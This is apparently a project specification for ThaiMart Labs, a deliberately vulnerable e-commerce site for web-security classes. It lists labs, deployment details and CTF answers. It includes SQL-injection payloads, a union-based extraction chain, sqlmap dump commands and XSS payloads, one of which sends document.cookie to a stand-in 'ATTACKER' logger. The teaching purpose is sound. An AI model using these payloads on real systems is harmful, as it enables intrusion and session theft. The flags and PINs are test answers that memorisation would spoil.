# ThaiMart Labs - Project Specification

## Overview

**ThaiMart** is a fictional Thai e-commerce platform used as the theme for cybersecurity education labs. Students practice web security concepts in a realistic environment.

**Slogan:** ช้อปสนุก ส่งไว ทั่วไทย

**Repository:** https://github.com/phwrscr1pt/WEBlab.git

**Status:** ✅ Deployed and Running

## Labs Summary

| Lab | Topic | Type | Flag/Credential |
|-----|-------|------|-----------------|
| 01 | HTTP Methods | Teaching | - |
| 02 | Cookie/Session | Teaching | user1 / password123 |
| 03 | SQL Basics | Teaching | - |
| 04 | SQL Injection | Vulnerable | seller1 / securepass99 |
| 05 | Union SQLi | Vulnerable | superadmin in DB |
| 06 | SQLmap | Vulnerable | secret_orders table |
| 07 | Reflected XSS | Vulnerable | - |
| 08 | Cookie Stealing | Vulnerable | member1 / 1234 |
| 09 | Stored XSS | Vulnerable | - |
| 10 | Burp Intercept | CTF | `SMC{1nt3rc3pt_m4st3r}` |
| 11 | Burp Repeater | CTF | `SMC{r3p34t3r_h34d3r_f0und}` |
| 12 | Burp Intruder | CTF | `SMC{brut3_f0rc3_w1ns}` |

## Tech Stack

| Component | Technology |
|-----------|------------|
| Runtime | Node.js 20 |
| Framework | Express 4 |
| Database | PostgreSQL 16 |
| Templates | EJS |
| Container | Docker Compose |

---

## Deployment

- **Server:** HPE ProLiant Gen 9 (Proxmox VM)
- **OS:** Ubuntu 22.04 Desktop
- **Method:** Docker containers

### Lab VM Details

| Item | Value |
|------|-------|
| VM Name | `weblab` |
| VM IP | `10.10.61.87` |
| VM User | `asdf` |
| SSH Auth | SSH Key (no password) |
| Gateway | `10.10.61.4` |
| Interface | `enp6s18` |

### Network Topology

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                        │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    │ Tailscale VPN
                                    ▼
┌─────────────────────┐      ┌─────────────────────┐      ┌─────────────────────┐
│   Claude's Machine  │      │    Jump Host        │      │   ThaiMart Lab VM   │
│   (Windows)         │ ───► │    (root-agent)     │ ───► │     (weblab)        │
│                     │      │                     │      │                     │
│   Can reach:        │ SSH  │   IP: 100.107.182.15│ SSH  │   IP: 10.10.61.87   │
│   - Tailscale IPs   │      │   User: root-agent  │      │   User: asdf        │
│   - Internet        │      │                     │      │                     │
│                     │      │   Can reach:        │      │   Services:         │
│   Cannot reach:     │      │   - 10.10.61.x LAN  │      │   - Web: port 80    │
│   - 10.10.61.x LAN  │      │   - Internet        │      │   - Logger: /logger │
│                     │      │   - Tailscale       │      │   - DB: internal    │
└─────────────────────┘      └─────────────────────┘      └─────────────────────┘
```

### SSH Access

SSH key authentication is configured. No password required.

```bash
# SSH Config (~/.ssh/config)
Host jump
    HostName 100.107.182.15
    User root-agent

Host thaimart-lab
    HostName 10.10.61.87
    User asdf
    ProxyJump jump

# Quick access
ssh thaimart-lab

# Run commands
ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose ps"
```

### Access URLs

| Service | URL |
|---------|-----|
| Homepage (Hub) | http://10.10.61.87 |
| Cookie Logger | http://10.10.61.87/logger |
| Lab 01 - Shopping Cart | http://10.10.61.87/lab01 |
| Lab 02 - Member Login | http://10.10.61.87/lab02 |
| Lab 03 - SQL Playground | http://10.10.61.87/lab03 |
| Lab 04 - Seller Portal (SQLi) | http://10.10.61.87/lab04 |
| Lab 05 - Staff Directory (SQLi) | http://10.10.61.87/lab05 |
| Lab 06 - SQLmap (Instructions) | http://10.10.61.87/lab06 |
| Lab 06 - SQLmap (Target) | http://10.10.61.87/lab06?id=1 |
| Lab 07 - Product Search (XSS) | http://10.10.61.87/lab07 |
| Lab 08 - Member Search (XSS) | http://10.10.61.87/lab08 |
| Lab 09 - Reviews (Stored XSS) | http://10.10.61.87/lab09 |
| Lab 10 - Flash Sale (Burp Intercept) | http://10.10.61.87/lab10 |
| Lab 11 - Internal API (Burp Repeater) | http://10.10.61.87/lab11 |
| Lab 12 - Gift Card (Burp Intruder) | http://10.10.61.87/lab12 |

### Quick Deploy

```bash
# Deploy remotely (using SSH alias)
ssh thaimart-lab "cd ~/ThaiMart-Labs && git pull && sudo docker-compose up -d"

# Or on Lab VM directly
cd ~/ThaiMart-Labs
git pull
sudo docker-compose up -d
```

## Color Scheme

```css
:root {
  --primary: #f97316;      /* Orange - ThaiMart brand */
  --primary-dark: #c2410c;
  --secondary: #1e3a5f;    /* Navy */
  --background: #f8fafc;
  --text-dark: #1a1a1a;
  --text-muted: #6b7280;
  --border: #e5e7eb;
  --success: #16a34a;
  --danger: #dc2626;
}
```

## Project Structure

```
ThaiMart-Labs/
├── CLAUDE.md               # This file
├── README.md               # Setup instructions
├── docker-compose.yml      # Docker orchestration
├── Dockerfile              # Node.js image
├── package.json            # Dependencies
├── .gitignore
├── .env.example
│
├── docs/
│   └── DEMO_SCRIPT.md      # Instructor demo script (Web Essentials)
│
├── src/
│   ├── app.js              # Express entry point
│   │
│   ├── routes/
│   │   ├── index.js        # Hub page
│   │   ├── lab01.js        # HTTP Methods + Live Sync
│   │   ├── lab02.js        # Stateless Demo + Themes
│   │   ├── lab03.js        # SQL Playground
│   │   ├── lab04.js        # Auth Bypass (SQLi)
│   │   ├── lab05.js        # Union SQLi
│   │   ├── lab06.js        # SQLmap Target
│   │   ├── lab07.js        # Reflected XSS
│   │   ├── lab08.js        # Cookie Stealing
│   │   ├── lab09.js        # Stored XSS
│   │   ├── lab10.js        # Burp Intercept
│   │   ├── lab11.js        # Burp Repeater
│   │   ├── lab12.js        # Burp Intruder
│   │   └── logger.js       # Cookie catcher
│   │
│   ├── views/
│   │   ├── layout.ejs
│   │   ├── hub.ejs
│   │   ├── 404.ejs
│   │   ├── error.ejs
│   │   └── labs/
│   │       ├── lab01.ejs           # Shopping Cart + Network Inspector
│   │       ├── lab02-home.ejs      # Member home
│   │       ├── lab02-login.ejs     # Login form
│   │       ├── lab02-profile.ejs   # Profile + Cookie exercises
│   │       ├── lab03.ejs
│   │       ├── lab04-*.ejs
│   │       ├── lab05.ejs
│   │       ├── lab06.ejs           # Instructions page
│   │       ├── lab06-target.ejs    # Vulnerable target page
│   │       ├── lab07.ejs
│   │       ├── lab08-*.ejs
│   │       ├── lab09.ejs
│   │       ├── lab10.ejs           # Flash Sale (Intercept)
│   │       ├── lab11.ejs           # Internal API (Repeater)
│   │       ├── lab12.ejs           # Gift Card (Intruder)
│   │       └── logger.ejs
│   │
│   └── public/
│       ├── css/style.css
│       └── js/main.js
│
└── database/
    └── init.sql            # Schema + seed data
```

## Labs Detail

### Lab 01: HTTP Methods (Shopping Cart + Network Inspector)
- **Path:** `/lab01`
- **Story:** ThaiMart Shopping Cart
- **Concept:** GET, POST, PUT, DELETE methods through real e-commerce actions
- **Mode:** Interactive shopping with real-time HTTP inspection
- **Vulnerable:** No
- **UI Layout:**
  - **Left side:** Product grid + Shopping cart
  - **Right side:** Network Inspector panel
- **Shopping Features:**
  - Product cards with "เพิ่มลงตะกร้า" button → triggers POST
  - Cart with quantity edit → triggers PUT
  - Cart with remove button → triggers DELETE
  - Clear cart button
- **Network Inspector shows:**
  - Request method and path
  - Request body (JSON)
  - Equivalent curl command (with Copy button)
  - JSON response from server
- **Live Sync Feature:**
  - Cart auto-refreshes every 2 seconds via polling
  - When students run curl commands in terminal, the browser updates automatically
  - Green "Live Sync" indicator shows polling status
  - Polling pauses when browser tab is hidden (saves resources)
- **Learning:** "สิ่งที่ฉันกดบนเว็บ = curl command นี้" / "curl ใน terminal → เห็นผลบนเว็บทันที"
- **API Endpoints:**
  | Method | Path | Action |
  |--------|------|--------|
  | GET | `/lab01/products` | List all products |
  | GET | `/lab01/cart` | View current cart |
  | POST | `/lab01/cart` | Add item to cart |
  | PUT | `/lab01/cart/:id` | Update quantity |
  | DELETE | `/lab01/cart/:id` | Remove item |
- **Example curl commands:**
  ```bash
  # View products
  curl http://10.10.61.87/lab01/products

  # Add to cart
  curl -X POST http://10.10.61.87/lab01/cart \
       -H "Content-Type: application/json" \
       -d '{"product_id": 1, "quantity": 1}'

  # Update quantity
  curl -X PUT http://10.10.61.87/lab01/cart/1 \
       -H "Content-Type: application/json" \
       -d '{"quantity": 3}'

  # Remove from cart
  curl -X DELETE http://10.10.61.87/lab01/cart/1
  ```

### Lab 02: Stateless Demo (Cookie & Session)
- **Path:** `/lab02`
- **Story:** ThaiMart Member Login
- **Credentials:** user1 / password123
- **Concept:** Cookies, session, stateless HTTP, theme persistence
- **Vulnerable:** No
- **Features:**
  - Theme switcher (light/dark/orange) stored in `thaimart_theme` cookie
  - Session stored in `thaimart_session` cookie
  - Interactive exercises on profile page
- **Cookie Exercises:**
  1. Delete `thaimart_session` → Reload → Must login again
  2. Edit `thaimart_theme` value in DevTools → Reload → Page changes theme
- **Cookies used:**
  | Cookie | Purpose |
  |--------|---------|
  | `thaimart_session` | Session ID |
  | `thaimart_user` | Username |
  | `thaimart_theme` | Theme preference (light/dark/orange) |

### Lab 03: SQL Playground (Type SQL Yourself)
- **Path:** `/lab03`
- **Story:** Internal SQL Explorer
- **Concept:** SQL commands (SELECT, INSERT, UPDATE, DELETE)
- **Mode:** Hands-on (students type SQL in textarea)
- **Vulnerable:** No (blocked: DROP, TRUNCATE, ALTER, CREATE, GRANT, REVOKE)
- **How it works:**
  - Single textarea for typing SQL queries
  - Run button executes query against `playground_products` table
  - Reset Table button restores seed data
  - Clickable examples populate the textarea
  - Right panel shows current table data
- **Table schema:** `playground_products (id, name, price, stock, category)`

### Lab 04: Auth Bypass
- **Path:** `/lab04`
- **Story:** ThaiMart Seller Portal
- **Credentials:** seller1 / securepass99
- **Vulnerable:** YES - SQL Injection
- **Attack:** `' OR '1'='1` or `admin'--`

### Lab 05: Union-Based SQLi
- **Path:** `/lab05`
- **Story:** Staff Directory Search
- **Vulnerable:** YES - Union SQL Injection
- **Attack Path:**
  1. `' ORDER BY 4--` (find columns)
  2. `' UNION SELECT 1,2,3,4--` (display columns)
  3. `' UNION SELECT 1,version(),3,4--` (DB version)
  4. `' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--`
  5. `' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'--`
  6. `' UNION SELECT 1,username,password_hash,role FROM admin_credentials--`
- **Hidden Data:** admin_credentials table with superadmin account

### Lab 06: SQLmap Target (Terminal-First)
- **Path:** `/lab06` (instructions) or `/lab06?id=1` (target)
- **Story:** Product Category Page
- **Mode:** Terminal-first (students use sqlmap commands)
- **Vulnerable:** YES - Numeric SQL Injection
- **How it works:**
  - `/lab06` shows instruction page with sqlmap commands
  - `/lab06?id=1` shows vulnerable target page
  - Students run sqlmap from terminal
- **Attack commands:**
  ```bash
  # Step 1: Detect injection
  sqlmap -u "http://10.10.61.87/lab06?id=1" --batch

  # Step 2: List databases
  sqlmap -u "http://10.10.61.87/lab06?id=1" --dbs --batch

  # Step 3: List tables
  sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart --tables --batch

  # Step 4: Dump secret table
  sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --dump --batch
  ```
- **Hidden Data:** secret_orders table with fake credit cards

### Lab 07: Reflected XSS
- **Path:** `/lab07`
- **Story:** Product Search
- **Vulnerable:** YES - Reflected XSS
- **Attack:** `<script>alert(1)</script>`

### Lab 08: Cookie Stealing
- **Path:** `/lab08`
- **Story:** Member Search
- **Credentials:** member1 / 1234
- **Vulnerable:** YES - Reflected XSS + Cookie Theft
- **Attack:** `<img src=x onerror="fetch('http://ATTACKER/logger/catch?c='+document.cookie)">`

### Lab 09: Stored XSS
- **Path:** `/lab09`
- **Story:** Product Reviews
- **Vulnerable:** YES - Stored XSS
- **Attack:** Submit review with `<script>alert('XSS')</script>`

### Lab 10: Burp Suite - Intercept
- **Path:** `/lab10`
- **Story:** Flash Sale Shopping
- **Concept:** HTTP Request Interception
- **Vulnerable:** Hidden form field manipulation
- **Flag:** `SMC{1nt3rc3pt_m4st3r}`
- **How it works:**
  - Order form has hidden `discount_code` field (empty)
  - Student intercepts POST request with Burp
  - Changes `discount_code` to `THAIM4RT_VIP_2026`
  - Server returns flag if code matches
- **Hint endpoint:** `GET /lab10/api/promotions` reveals the code

### Lab 11: Burp Suite - Repeater
- **Path:** `/lab11`
- **Story:** Internal API Access
- **Concept:** Reading responses, adding headers
- **Vulnerable:** No (teaching tool)
- **Flag:** `SMC{r3p34t3r_h34d3r_f0und}`
- **How it works:**
  1. `GET /lab11/api/status` returns `access_token` in JSON
  2. Student sends to Repeater, changes path to `/lab11/api/secret`
  3. Adds header `X-Access-Token: [token from step 1]`
  4. Server returns flag if token matches
- **Endpoints:**
  | Method | Path | Description |
  |--------|------|-------------|
  | GET | `/lab11/api/status` | Returns token in response |
  | GET | `/lab11/api/secret` | Requires X-Access-Token header |

### Lab 12: Burp Suite - Intruder
- **Path:** `/lab12`
- **Story:** Gift Card PIN Redemption
- **Concept:** Brute force attacks
- **Vulnerable:** No rate limiting
- **Flag:** `SMC{brut3_f0rc3_w1ns}`
- **Correct PIN:** `7392`
- **How it works:**
  - Student enters any PIN, captures request
  - Sends to Intruder, marks PIN position
  - Uses Numbers payload (0000-9999, 4 digits)
  - Correct PIN returns HTTP 200 with flag
- **Endpoints:**
  | Method | Path | Description |
  |--------|------|-------------|
  | POST | `/lab12/verify` | JSON API: `{"pin": "XXXX"}` |
  | POST | `/lab12/redeem` | Form submission (HTML response) |

### Logger (Cookie Catcher)
- **Path:** `/logger`
- **Endpoint:** `GET /logger/catch?c=COOKIE`
- **Purpose:** Students' attacker server for XSS labs

## Database Tables

- `playground_products` - Lab 03
- `seller_accounts` - Lab 04
- `staff` - Lab 05
- `admin_credentials` - Lab 05 (secret)
- `categories` - Lab 06
- `category_products` - Lab 06
- `secret_orders` - Lab 06 (secret)
- `search_products` - Lab 07
- `reviews` - Lab 09

## Commands

```bash
# Local Development
docker-compose up -d
docker-compose logs -f web

# Reset database
docker-compose down -v && docker-compose up -d

# Rebuild
docker-compose up -d --build

# Deploy to Lab VM
ssh thaimart-lab "cd ~/ThaiMart-Labs && git pull && sudo docker-compose up -d"

# Deploy with rebuild
ssh thaimart-lab "cd ~/ThaiMart-Labs && git pull && sudo docker-compose up -d --build"

# View logs on Lab VM (morgan shows all HTTP requests)
ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose logs -f web"

# Reset Lab VM database
ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose down -v && sudo docker-compose up -d"

# Check container status
ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose ps"
```

---

## Security Notes

**INTENTIONALLY VULNERABLE - EDUCATIONAL USE ONLY**

- Deploy only on isolated networks
- Never use in production
- Teach responsible disclosure

---

*Last Updated: 2026-04-19*
- Added morgan for HTTP request logging (visible in docker-compose logs)
- SSH config with `thaimart-lab` alias (passwordless access)
- Lab 01: Live Sync (curl → browser updates automatically)
- Lab 02: Theme switcher + cookie exercises
- Labs 10-12: Burp Suite CTF challenges with flags
- docs/DEMO_SCRIPT.md: Instructor demo for Web Essentials
